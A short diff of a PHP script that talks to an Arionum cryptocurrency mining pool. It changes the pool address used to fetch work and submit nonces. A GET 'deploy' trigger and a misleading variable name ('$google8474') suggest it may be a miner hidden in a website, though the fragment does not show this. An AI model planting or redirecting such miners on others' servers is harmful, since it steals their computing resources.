@@ -4,7 +4,7 @@ if($_GET["q"] == "deploy")
   
 {
 
-$google8474 = file_get_contents("http://mine.arionumpool.com/mine.php?q=info");
+$google8474 = file_get_contents("http://aropool.com/mine.php?q=info");
 
 $google8474 = preg_replace("/mine/","",$google8474);
 
@@ -51,7 +51,7 @@ $opts = [
 
 $context = stream_context_create($opts);
 
-$res = file_get_contents("http://mine.arionumpool.com/mine.php?q=submitNonce", false, $context);
+$res = file_get_contents("http://aropool.com/mine.php?q=submitNonce", false, $context);
 $data = json_decode($res, true);
 
 if ($data['status'] == "ok")
